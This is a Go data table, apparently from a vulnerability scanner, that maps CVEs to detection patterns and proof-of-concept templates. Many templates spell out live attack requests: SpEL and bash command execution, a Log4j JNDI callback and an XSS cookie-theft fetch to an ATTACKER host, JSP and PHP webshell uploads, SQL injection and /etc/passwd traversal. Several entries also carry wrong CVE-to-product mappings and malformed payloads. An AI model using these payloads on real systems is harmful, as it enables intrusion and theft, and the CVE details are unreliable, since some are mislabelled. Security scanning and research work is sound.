		PoCTemplate: ExploitPoC{Type: "request", Description: "HTTPoxy via Proxy header in CGI",
			Steps:      []string{"Send request with Proxy header to CGI script"},
			Request:    "GET /cgi-bin/test.cgi HTTP/1.1\r\nHost: TARGET\r\nProxy: http://ATTACKER\r\n\r\n",
			Conditions: "CGI scripts enabled",
		},
	},
	{
		CVEID: "CVE-2022-22963", Description: "Spring Cloud Function SpEL injection",
		Severity: "critical", CVSS: 9.8, CWE: "CWE-94", Product: "Spring Cloud Function", Version: "3.1.x,3.2.x", FixedIn: "3.1.7,3.2.3",
		Impact: "RCE via SpEL expression injection", Remediation: "Upgrade Spring Cloud Function",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2022-22963"},
		Patterns:   []cvePattern{{Type: "header", Match: `(?i)spring.cloud.function`}, {Type: "path", Match: `(?i)/functionRouter`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "SpEL injection via routing header",
			Steps:      []string{"Send POST to /functionRouter", "Set routing-expression header with SpEL payload"},
			Request:    "POST /functionRouter HTTP/1.1\r\nHost: TARGET\r\nspring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec('id')\r\nContent-Length: 0\r\n\r\n",
			Conditions: "Spring Cloud Function with routing expression enabled",
		},
	},
	{
		CVEID: "CVE-2022-22950", Description: "Spring Expression (SpEL) DoS vulnerability",
		Severity: "medium", CVSS: 6.5, CWE: "CWE-400", Product: "Spring Framework", Version: "5.3.x", FixedIn: "5.3.20",
		Impact: "Denial of Service via crafted SpEL expression", Remediation: "Upgrade Spring Framework",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2022-22950"},
		Patterns:   []cvePattern{{Type: "body", Match: `(?i)Whitelabel Error Page`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "DoS via crafted SpEL expression",
			Steps:      []string{"Send crafted SpEL expression in parameters"},
			Conditions: "Spring Framework with SpEL evaluation",
		},
	},
	{
		CVEID: "CVE-2024-22234", Description: "Spring Security authorization bypass",
		Severity: "high", CVSS: 8.1, CWE: "CWE-863", Product: "Spring Security", Version: "<6.2.4", FixedIn: "6.2.4",
		Impact: "Authorization bypass via URL authorization", Remediation: "Upgrade Spring Security",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2024-22234"},
		Patterns:   []cvePattern{{Type: "body", Match: `(?i)Whitelabel Error Page`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "Access protected endpoints via bypass",
			Steps:      []string{"Craft request to bypass Spring Security URL authorization"},
			Conditions: "Spring Security with URL authorization",
		},
	},
	{
		CVEID: "CVE-2022-2884", Description: "GitLab SSRF via import",
		Severity: "high", CVSS: 8.6, CWE: "CWE-918", Product: "GitLab", Version: "various", FixedIn: "15.6.3",
		Impact: "Server-side request forgery via project import", Remediation: "Upgrade GitLab",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2022-2884"},
		Patterns:   []cvePattern{{Type: "header", Match: `(?i)X-Gitlab`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "SSRF via import URL",
			Steps:      []string{"Use project import feature to send requests to internal hosts"},
			Conditions: "GitLab with project import enabled",
		},
	},
	{
		CVEID: "CVE-2023-46747", Description: "F5 BIG-IP Configuration utility unauthenticated RCE",
		Severity: "critical", CVSS: 9.8, CWE: "CWE-306", Product: "F5 BIG-IP", Version: "<17.1.0", FixedIn: "17.1.0.4",
		Impact: "Unauthenticated RCE via configuration utility", Remediation: "Upgrade BIG-IP or restrict management access",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2023-46747"},
		Patterns:   []cvePattern{{Type: "body", Match: `(?i)BIG-IP`}, {Type: "header", Match: `(?i)BIGipServer`}},
		PoCTemplate: ExploitPoC{Type: "script", Description: "Auth bypass in BIG-IP config utility",
			Steps:      []string{"Send crafted request to /mgmt/tm/util/bash", "Bypass authentication via request smuggling"},
			Script:     "#!/bin/bash\ncurl -sk -X POST \"https://TARGET/mgmt/tm/util/bash\" -H \"Content-Type: application/json\" -d '{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}'",
			Conditions: "BIG-IP with management interface accessible",
		},
	},
	{
		CVEID: "CVE-2021-22986", Description: "F5 BIG-IP and BIG-IQ iControl REST RCE",
		Severity: "critical", CVSS: 9.8, CWE: "CWE-306", Product: "F5 BIG-IP", Version: "<16.0.1.2", FixedIn: "16.0.1.2",
		Impact: "Unauthenticated RCE or DoS via iControl REST", Remediation: "Upgrade BIG-IP",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2021-22986"},
		Patterns:   []cvePattern{{Type: "body", Match: `(?i)BIG-IP`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "Unauthenticated RCE via REST API",
			Steps:      []string{"Send POST to /mgmt/tm/util/bash with auth headers"},
			Request:    "POST /mgmt/tm/util/bash HTTP/1.1\r\nHost: TARGET\r\nAuthorization: Basic YWRtaW46YWRtaW4=\r\nContent-Type: application/json\r\n\r\n{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}",
			Conditions: "BIG-IP with iControl REST accessible",
		},
	},
	{
		CVEID: "CVE-2024-3094", Description: "XZ Utils malicious backdoor (supply chain attack)",
		Severity: "critical", CVSS: 10.0, CWE: "CWE-506", Product: "XZ Utils", Version: "5.6.0,5.6.1", FixedIn: "5.6.2",
		Impact: "RCE via SSH authentication bypass", Remediation: "Downgrade XZ Utils to 5.4.x or upgrade to 5.6.2+",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2024-3094"},
		Patterns:   []cvePattern{{Type: "header", Match: `(?i)liblzma`}},
		PoCTemplate: ExploitPoC{Type: "manual", Description: "Backdoor activates via SSH, not HTTP",
			Steps:      []string{"Check if system has XZ Utils 5.6.0/5.6.1", "Run: xz --version", "Monitor for unusual liblzma activity"},
			Conditions: "Linux with XZ Utils 5.6.0/5.6.1 and OpenSSH with systemd",
		},
	},
	{
		CVEID: "CVE-2021-45046", Description: "Log4j2 incomplete fix for CVE-2021-44228",
		Severity: "critical", CVSS: 9.0, CWE: "CWE-502", Product: "Apache Log4j2", Version: "2.0-beta9 to 2.15.0", FixedIn: "2.16.0",
		Impact: "RCE and information leak via JNDI lookup", Remediation: "Upgrade Log4j to 2.16.0+",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2021-45046"},
		Patterns:   []cvePattern{{Type: "header", Match: `(?i)Apache`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "JNDI injection with Thread Context Map pattern layout",
			Steps:      []string{"Send payload using Thread Context Map"},
			Request:    "GET / HTTP/1.1\r\nHost: TARGET\r\nUser-Agent: ${jndi:ldap://ATTACKER:1389/exploit}\r\n\r\n",
			Conditions: "Log4j 2.0-beta9 to 2.15.0",
		},
	},
	{
		CVEID: "CVE-2021-45105", Description: "Log4j2 DoS via uncontrolled recursion in lookup",
		Severity: "medium", CVSS: 5.9, CWE: "CWE-674", Product: "Apache Log4j2", Version: "2.0-beta9 to 2.15.0", FixedIn: "2.17.0",
		Impact: "Denial of Service via recursive lookup", Remediation: "Upgrade Log4j to 2.17.0+",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2021-45105"},
		Patterns:   []cvePattern{{Type: "header", Match: `(?i)Apache`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "DoS via infinite recursion",
			Steps:      []string{"Send crafted string with recursive lookup"},
			Conditions: "Log4j 2.0-beta9 to 2.15.0",
		},
	},
	{
		CVEID: "CVE-2021-44832", Description: "Log4j2 RCE via JDBC Appender with JNDI",
		Severity: "high", CVSS: 6.6, CWE: "CWE-94", Product: "Apache Log4j2", Version: "2.0-alpha1 to 2.16.0", FixedIn: "2.17.1",
		Impact: "RCE via JDBC Appender with JNDI data source", Remediation: "Upgrade Log4j to 2.17.1+",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2021-44832"},
		Patterns:   []cvePattern{{Type: "header", Match: `(?i)Apache`}},
		PoCTemplate: ExploitPoC{Type: "manual", Description: "Requires write access to Log4j configuration",
			Steps:      []string{"Modify Log4j config to use JDBC Appender with JNDI"},
			Conditions: "Write access to Log4j configuration",
		},
	},
	{
		CVEID: "CVE-2014-7169", Description: "Bash Shellshock - incomplete fix for CVE-2014-6271",
		Severity: "high", CVSS: 9.0, CWE: "CWE-78", Product: "GNU Bash", Version: "<4.3", FixedIn: "4.3 patch 26",
		Impact: "RCE through environment variable processing", Remediation: "Update Bash to latest patched version",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2014-7169"},
		Patterns:   []cvePattern{{Type: "path", Match: `(?i)/cgi-bin/`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "Shellshock variant via function import",
			Steps:      []string{"Send crafted User-Agent with function body"},
			Request:    "GET /cgi-bin/test.cgi HTTP/1.1\r\nHost: TARGET\r\nUser-Agent: () { _; } >_[$($())] { echo poc; cat /etc/passwd; }\r\n\r\n",
			Conditions: "CGI script executed by vulnerable Bash",
		},
	},
	{
		CVEID: "CVE-2017-12615", Description: "Apache Tomcat PUT method RCE",
		Severity: "critical", CVSS: 9.8, CWE: "CWE-434", Product: "Apache Tomcat", Version: "7.0.0-7.0.81", FixedIn: "7.0.82",
		Impact: "RCE via PUT with JSP file upload", Remediation: "Upgrade Tomcat or disable PUT",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2017-12615"},
		Patterns:   []cvePattern{{Type: "server", Match: `(?i)Apache-Coyote`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "Upload JSP webshell via PUT method",
			Steps:      []string{"Send PUT request with JSP code", "Use path traversal to bypass extension filter"},
			Request:    "PUT /test.jsp/ HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 50\r\n\r\n<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>",
			Conditions: "Tomcat 7.0.0-7.0.81 with readonly=false",
		},
	},
	{
		CVEID: "CVE-2019-0232", Description: "Apache Tomcat CGI Servlet RCE on Windows",
		Severity: "high", CVSS: 7.5, CWE: "CWE-78", Product: "Apache Tomcat", Version: "7.0.0-9.0.17", FixedIn: "9.0.18,8.5.40,7.0.94",
		Impact: "RCE on Windows with CGI servlet", Remediation: "Upgrade Tomcat or disable enableCmdLineArguments",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2019-0232"},
		Patterns:   []cvePattern{{Type: "server", Match: `(?i)Apache-Coyote`}, {Type: "path", Match: `(?i)/cgi-bin/`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "Command injection via CGI servlet",
			Steps:      []string{"Send GET with OS command in query string"},
			Request:    "GET /cgi-bin/test.bat?&dir HTTP/1.1\r\nHost: TARGET\r\n\r\n",
			Conditions: "Windows with CGI servlet enabled",
		},
	},
	{
		CVEID: "CVE-2020-1938", Description: "Apache Tomcat AJP file read/RCE (Ghostcat)",
		Severity: "critical", CVSS: 9.8, CWE: "CWE-200", Product: "Apache Tomcat", Version: "6.x-9.0.30", FixedIn: "9.0.31",
		Impact: "File read and potential RCE via AJP connector", Remediation: "Upgrade Tomcat or disable AJP",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2020-1938"},
		Patterns:   []cvePattern{{Type: "server", Match: `(?i)Apache-Coyote`}},
		PoCTemplate: ExploitPoC{Type: "script", Description: "Exploit AJP connector (port 8009)",
			Steps:      []string{"Connect to AJP port 8009", "Send crafted AJP request to read files"},
			Script:     "#!/usr/bin/env python3\n# AJP Ghostcat exploit - connects to port 8009\nimport socket\ns = socket.create_connection(('TARGET', 8009))\ns.send(b'\x12\x02\x02\x13\x08\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x13GET / WEB-INF/web.xml HTTP/1.1\n\x00\x00\x0f\x01\x00\x00\x00\x00')\nprint(s.recv(4096))",
			Conditions: "Tomcat with AJP connector enabled",
		},
	},
	{
		CVEID: "CVE-2020-13935", Description: "Apache Tomcat WebSocket DoS",
		Severity: "high", CVSS: 7.5, CWE: "CWE-400", Product: "Apache Tomcat", Version: "<9.0.37", FixedIn: "9.0.37,8.5.57,7.0.104",
		Impact: "DoS via crafted WebSocket frames", Remediation: "Upgrade Tomcat",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2020-13935"},
		Patterns:   []cvePattern{{Type: "server", Match: `(?i)Apache-Coyote`}},
		PoCTemplate: ExploitPoC{Type: "script", Description: "Send oversized WebSocket frames",
			Steps:      []string{"Open WebSocket connection", "Send frames with invalid payload length"},
			Script:     "#!/usr/bin/env python3\nimport websocket\nws = websocket.create_connection('ws://TARGET')\nws.send('A' * 100000)\nws.close()",
			Conditions: "WebSocket endpoints enabled",
		},
	},
	{
		CVEID: "CVE-2018-7602", Description: "Drupal Drupalgeddon 3 - RCE (authenticated)",
		Severity: "critical", CVSS: 8.1, CWE: "CWE-79", Product: "Drupal", Version: "7.x,8.x", FixedIn: "7.59,8.5.4",
		Impact: "RCE for authenticated users with views access", Remediation: "Update Drupal",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2018-7602"},
		Patterns:   []cvePattern{{Type: "meta", Match: `(?i)Drupal`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "Exploit via Views AJAX",
			Steps:      []string{"Requires authenticated user with views access"},
			Request:    "POST /views/ajax?_wrapper_format=drupal_ajax HTTP/1.1\r\nHost: TARGET\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: <session_cookie>\r\n\r\nview_name=frontpage&view_display_id=page_1",
			Conditions: "Authenticated Drupal user, Views module",
		},
	},
	{
		CVEID: "CVE-2019-6340", Description: "Drupal REST RCE",
		Severity: "high", CVSS: 8.1, CWE: "CWE-94", Product: "Drupal", Version: "8.6.x", FixedIn: "8.6.10",
		Impact: "RCE through REST API for authenticated users", Remediation: "Update Drupal",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2019-6340"},
		Patterns:   []cvePattern{{Type: "meta", Match: `(?i)Drupal`}, {Type: "path", Match: `(?i)/jsonapi`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "REST API exploitation",
			Steps:      []string{"Send crafted request to JSON:API endpoint"},
			Conditions: "Drupal 8.6.x with REST and JSON:API enabled",
		},
	},
	{
		CVEID: "CVE-2019-10845", Description: "Joomla GTranslate Plugin SQL Injection",
		Severity: "high", CVSS: 7.5, CWE: "CWE-89", Product: "Joomla!", Version: "with GTranslate", FixedIn: "GTranslate Pro 6.1.0",
		Impact: "SQL injection leading to data extraction", Remediation: "Update GTranslate plugin",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2019-10845"},
		Patterns:   []cvePattern{{Type: "body", Match: `(?i)Joomla`}, {Type: "path", Match: `(?i)/administrator`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "SQLi via GTranslate lang parameter",
			Steps:      []string{"Send crafted query to GTranslate endpoint"},
			Request:    "GET /?option=com_gtranslate&lang=' UNION SELECT 1,2,3,4,5-- HTTP/1.1\r\nHost: TARGET\r\n\r\n",
			Conditions: "Joomla with GTranslate plugin",
		},
	},
	{
		CVEID: "CVE-2023-23752", Description: "Joomla Improper Access Control in Web Services API",
		Severity: "high", CVSS: 7.5, CWE: "CWE-284", Product: "Joomla!", Version: "<4.2.8", FixedIn: "4.2.8",
		Impact: "Unauthorized access to user data via web services API", Remediation: "Update Joomla",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2023-23752"},
		Patterns:   []cvePattern{{Type: "body", Match: `(?i)Joomla`}, {Type: "path", Match: `(?i)/api/`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "Access user data via unauthenticated API",
			Steps:      []string{"Send GET to /api/v1/users"},
			Request:    "GET /api/v1/users HTTP/1.1\r\nHost: TARGET\r\n\r\n",
			Conditions: "Joomla 4.x with web services enabled",
		},
	},
	{
		CVEID: "CVE-2019-12605", Description: "Joomla SQL Injection in com_fields",
		Severity: "high", CVSS: 7.5, CWE: "CWE-89", Product: "Joomla!", Version: "<3.9.12", FixedIn: "3.9.12",
		Impact: "SQL injection in com_fields component", Remediation: "Update Joomla to 3.9.12+",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2019-12605"},
		Patterns:   []cvePattern{{Type: "body", Match: `(?i)Joomla`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "SQLi via com_fields",
			Steps:      []string{"Send crafted request to com_fields endpoint"},
			Request:    "GET /index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml HTTP/1.1\r\nHost: TARGET\r\n\r\n",
			Conditions: "Joomla with com_fields component",
		},
	},
	{
		CVEID: "CVE-2019-9978", Description: "WordPress Social Warships Plugin Stored XSS",
		Severity: "high", CVSS: 7.4, CWE: "CWE-79", Product: "WordPress Social Warships", Version: "<2.1.2", FixedIn: "2.1.2",
		Impact: "Stored XSS leading to admin account takeover", Remediation: "Update Social Warships to 2.1.2+",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2019-9978"},
		Patterns:   []cvePattern{{Type: "body", Match: `(?i)wp-content`}, {Type: "cookie", Match: `(?i)wordpress_`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "Stored XSS in export parameter",
			Steps:      []string{"Inject XSS in Social Warships settings"},
			Request:    "POST /wp-admin/admin-post.php?action=sw_export HTTP/1.1\r\nHost: TARGET\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nsocial_warships_export=<script>fetch('https://ATTACKER/?c='+document.cookie)</script>",
			Conditions: "WordPress with Social Warships < 2.1.2",
		},
	},
	{
		CVEID: "CVE-2020-11022", Description: "WordPress wp-file-manager RCE",
		Severity: "critical", CVSS: 9.8, CWE: "CWE-434", Product: "WordPress WP File Manager", Version: "<6.9", FixedIn: "6.9",
		Impact: "RCE through unrestricted file upload", Remediation: "Update WP File Manager to 6.9+",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2020-11022"},
		Patterns:   []cvePattern{{Type: "body", Match: `(?i)wp-content`}, {Type: "cookie", Match: `(?i)wordpress_`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "Upload PHP via file manager",
			Steps:      []string{"Use file manager to upload PHP webshell"},
			Request:    "POST /wp-admin/admin-ajax.php?action=wpfm_upload HTTP/1.1\r\nHost: TARGET\r\nContent-Type: multipart/form-data\r\n\r\n------boundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\nContent-Type: application/x-php\r\n\r\n<?php echo shell_exec($_GET['cmd']); ?>\r\n------boundary--",
			Conditions: "WordPress with WP File Manager < 6.9",
		},
	},
	{
		CVEID: "CVE-2023-44373", Description: "WordPress wpDiscuz Plugin Unauthenticated RCE",
		Severity: "critical", CVSS: 9.8, CWE: "CWE-434", Product: "WordPress wpDiscuz", Version: "<7.3.11", FixedIn: "7.3.11",
		Impact: "Unauthenticated RCE via file upload", Remediation: "Update wpDiscuz",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2023-44373"},
		Patterns:   []cvePattern{{Type: "body", Match: `(?i)wp-content/plugins/wpdiscuz`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "Upload via wpDiscuz comment attachment",
			Steps:      []string{"Post comment with malicious attachment"},
			Conditions: "WordPress with wpDiscuz < 7.3.11",
		},
	},
	{
		CVEID: "CVE-2024-23897", Description: "Jenkins arbitrary file read",
		Severity: "critical", CVSS: 9.8, CWE: "CWE-22", Product: "Jenkins", Version: "<2.442", FixedIn: "2.442,2.429.2",
		Impact: "Arbitrary file read via CLI API, potential RCE", Remediation: "Upgrade Jenkins",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2024-23897"},
		Patterns:   []cvePattern{{Type: "body", Match: `(?i)Jenkins`}, {Type: "header", Match: `(?i)X-Jenkins`}},
		PoCTemplate: ExploitPoC{Type: "script", Description: "Read files via Jenkins CLI",
			Steps:      []string{"Use Jenkins CLI to read arbitrary files"},
			Script:     "java -jar jenkins-cli.jar -s https://TARGET/ -auth user:token read-file /etc/passwd",
			Conditions: "Jenkins < 2.442 with CLI enabled",
		},
	},
	{
		CVEID: "CVE-2023-32924", Description: "Jenkins RCE via Pipeline Script Security bypass",
		Severity: "high", CVSS: 8.8, CWE: "CWE-79", Product: "Jenkins", Version: "<2.414.1", FixedIn: "2.414.1",
		Impact: "RCE through sandbox escape in Pipeline scripts", Remediation: "Upgrade Jenkins",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2023-32924"},
		Patterns:   []cvePattern{{Type: "body", Match: `(?i)Jenkins`}},
		PoCTemplate: ExploitPoC{Type: "manual", Description: "Craft malicious Pipeline script",
			Steps:      []string{"Create Pipeline with sandbox-escape payload"},
			Conditions: "Jenkins with Pipeline and Script Security plugin",
		},
	},
	{
		CVEID: "CVE-2024-4956", Description: "Sonatype Nexus Repository path traversal",
		Severity: "critical", CVSS: 9.8, CWE: "CWE-22", Product: "Nexus Repository", Version: "<3.68.0", FixedIn: "3.68.0",
		Impact: "Unauthenticated path traversal leading to file read", Remediation: "Upgrade Nexus Repository",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2024-4956"},
		Patterns:   []cvePattern{{Type: "body", Match: `(?i)Nexus`}, {Type: "path", Match: `(?i)/nexus/`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "Path traversal via encoded path",
			Steps:      []string{"Send request with encoded path traversal"},
			Request:    "GET /%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1\r\nHost: TARGET\r\n\r\n",
			Conditions: "Nexus Repository < 3.68.0",
		},
	},
	{
		CVEID: "CVE-2024-24919", Description: "Atlassian Confluence path traversal",
		Severity: "high", CVSS: 7.5, CWE: "CWE-22", Product: "Atlassian Confluence", Version: "<8.5.8", FixedIn: "8.5.8",
		Impact: "Path traversal allowing file read", Remediation: "Upgrade Confluence",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2024-24919"},
		Patterns:   []cvePattern{{Type: "body", Match: `(?i)Confluence`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "Path traversal in VPN component",
			Steps:      []string{"Send crafted request with path traversal"},
			Request:    "POST /pages/doenterpagevariables.action HTTP/1.1\r\nHost: TARGET\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n../../../../../../etc/passwd",
			Conditions: "Confluence < 8.5.8",
		},
	},
	{
		CVEID: "CVE-2023-27997", Description: "FortiGate SSL-VPN heap overflow (XORtigate)",
		Severity: "critical", CVSS: 9.8, CWE: "CWE-122", Product: "FortiOS", Version: "<7.2.5", FixedIn: "7.2.5,7.0.12,6.4.13",
		Impact: "Pre-auth RCE via SSL-VPN", Remediation: "Upgrade FortiOS",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2023-27997"},
		Patterns:   []cvePattern{{Type: "body", Match: `(?i)FortiGate|FortiGuard`}, {Type: "header", Match: `(?i)FortiWeb`}},
		PoCTemplate: ExploitPoC{Type: "manual", Description: "Heap overflow in SSL-VPN pre-auth",
			Steps:      []string{"Requires specialized exploit development"},
			Conditions: "FortiOS with SSL-VPN enabled",
		},
	},
	{
		CVEID: "CVE-2024-21762", Description: "FortiOS SSL-VPN out-of-bound write",
		Severity: "critical", CVSS: 9.6, CWE: "CWE-787", Product: "FortiOS", Version: "<7.4.3", FixedIn: "7.4.3,7.2.9,7.0.14,6.4.15",
		Impact: "Pre-auth RCE via SSL-VPN", Remediation: "Upgrade FortiOS",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2024-21762"},
		Patterns:   []cvePattern{{Type: "body", Match: `(?i)FortiGate|FortiOS`}},
		PoCTemplate: ExploitPoC{Type: "manual", Description: "Out-of-bound write in SSL-VPN",
			Steps:      []string{"Requires specialized exploit"},
			Conditions: "FortiOS with SSL-VPN",
		},
	},
	{
		CVEID: "CVE-2024-6387", Description: "OpenSSH regreSSHion race condition RCE",
		Severity: "high", CVSS: 8.1, CWE: "CWE-362", Product: "OpenSSH", Version: "8.5p1-9.7p1", FixedIn: "9.8p1",
		Impact: "RCE via race condition in signal handler (glibc-based)", Remediation: "Upgrade OpenSSH to 9.8p1+",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2024-6387"},
		Patterns:   []cvePattern{{Type: "header", Match: `(?i)OpenSSH`}},
		PoCTemplate: ExploitPoC{Type: "manual", Description: "Race condition in login handler",
			Steps:      []string{"Requires repeated connection attempts", "Race condition in SIGALRM handler"},
			Conditions: "OpenSSH 8.5p1-9.7p1 on glibc-based Linux",
		},
	},
	{
		CVEID: "CVE-2023-38408", Description: "OpenSSH ssh-agent PKCS#11 provider RCE",
		Severity: "critical", CVSS: 9.8, CWE: "CWE-94", Product: "OpenSSH", Version: "<9.3p2", FixedIn: "9.3p2",
		Impact: "RCE on ssh-agent host if attacker has forwarded agent access", Remediation: "Upgrade OpenSSH",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2023-38408"},
		Patterns:   []cvePattern{{Type: "header", Match: `(?i)OpenSSH`}},
		PoCTemplate: ExploitPoC{Type: "manual", Description: "Remote code execution via PKCS#11",
			Steps:      []string{"Requires forwarded ssh-agent with PKCS#11"},
			Conditions: "Agent forwarding with PKCS#11 provider",
		},
	},
	{
		CVEID: "CVE-2024-4577", Description: "PHP CGI argument injection (Windows)",
		Severity: "critical", CVSS: 9.8, CWE: "CWE-78", Product: "PHP", Version: "8.x (Windows CGI)", FixedIn: "8.3.8",
		Impact: "RCE on Windows through CGI argument injection", Remediation: "Update PHP or disable CGI",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2024-4577"},
		Patterns:   []cvePattern{{Type: "header", Match: `(?i)PHP`}, {Type: "path", Match: `(?i)\.php`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "Argument injection via best-fit characters",
			Steps:      []string{"Send request with crafted URL to PHP CGI"},
			Request:    "GET /index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1\r\nHost: TARGET\r\n\r\n",
			Conditions: "PHP on Windows with CGI mode enabled",
		},
	},
	{
		CVEID: "CVE-2024-2961", Description: "glibc iconv buffer overflow (affects PHP on Linux)",
		Severity: "critical", CVSS: 8.8, CWE: "CWE-120", Product: "glibc", Version: "<2.40", FixedIn: "2.40",
		Impact: "Buffer overflow via iconv, exploitable through PHP", Remediation: "Update glibc",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2024-2961"},
		Patterns:   []cvePattern{{Type: "header", Match: `(?i)PHP`}},
		PoCTemplate: ExploitPoC{Type: "manual", Description: "Buffer overflow through character conversion",
			Steps:      []string{"Trigger iconv with crafted input via PHP"},
			Conditions: "PHP on Linux with glibc < 2.40",
		},
	},
	{
		CVEID: "CVE-2023-3519", Description: "Citrix NetScaler RCE",
		Severity: "critical", CVSS: 9.4, CWE: "CWE-94", Product: "Citrix NetScaler", Version: "<14.1-8.50", FixedIn: "14.1-8.50,13.1-49.15",
		Impact: "Pre-auth RCE on Gateway/ADC", Remediation: "Upgrade NetScaler",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2023-3519"},
		Patterns:   []cvePattern{{Type: "body", Match: `(?i)Citrix|NetScaler`}, {Type: "path", Match: `(?i)/vpn/index.html`}},
		PoCTemplate: ExploitPoC{Type: "manual", Description: "RCE via NITRO API",
			Steps:      []string{"Requires specialized exploit"},
			Conditions: "NetScaler Gateway/ADC",
		},
	},
	{
		CVEID: "CVE-2024-30260", Description: "Roundcube Webmail XSS",
		Severity: "medium", CVSS: 6.1, CWE: "CWE-79", Product: "Roundcube", Version: "<1.6.7", FixedIn: "1.6.7,1.5.7",
		Impact: "XSS allowing session hijacking", Remediation: "Upgrade Roundcube",
		References: []string{"https://nvd.nist.gov/vuln/detail/CVE-2024-30260"},
		Patterns:   []cvePattern{{Type: "body", Match: `(?i)Roundcube`}, {Type: "path", Match: `(?i)/rcube|/webmail`}},
		PoCTemplate: ExploitPoC{Type: "request", Description: "XSS via crafted link or attachment",
			Steps:      []string{"Send email with crafted content"},
			Conditions: "Roundcube < 1.6.7",
		},
	},
}
